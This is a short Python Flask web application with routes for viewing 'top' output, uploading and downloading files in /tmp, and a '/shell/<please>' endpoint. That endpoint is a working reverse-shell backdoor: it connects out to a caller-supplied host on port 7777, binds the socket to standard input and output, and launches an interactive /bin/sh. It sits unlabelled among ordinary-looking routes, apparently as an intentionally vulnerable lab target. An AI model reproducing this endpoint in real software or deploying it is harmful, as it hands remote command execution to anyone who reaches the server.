#!/usr/bin/python3

from flask import Flask, render_template, flash, redirect, url_for, send_from_directory, request
from werkzeug.utils import secure_filename
import subprocess
import socket
import os

UPLOAD_FOLDER = '/tmp'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


@app.route('/')
def start():
    return render_template('start.html')


@app.route('/image')
def image():
    return render_template('image.html')


@app.route('/top')
def top():
    return render_template('top.html', output=subprocess.check_output(['top', '-b', '-n', '1']).decode('utf-8').replace('\\n', '\n').replace('\\t', '\t'))


@app.route('/shell')
@app.route('/shell/<please>')
def shell(please=None):
    if please:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((please, 7777))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        return '<p>Shell died...hopefully you got what you needed</p>'
    else:
        return render_template('please.html')


@app.route('/help')
def help():
    return render_template('help.html')


def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/file', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        # check if the post request has the file part
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        # If the user does not select a file, the browser submits an
        # empty file without a filename.
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return redirect(url_for('download_file', name=filename))
    return '''
    <!doctype html>
    <title>Upload new File</title>
    <h1>Upload new File</h1>
    <form method=post enctype=multipart/form-data>
      <input type=file name=file>
      <input type=submit value=Upload>
    </form>
    '''


@app.route('/uploads/<name>')
def download_file(name):
    return send_from_directory(app.config["UPLOAD_FOLDER"], name)
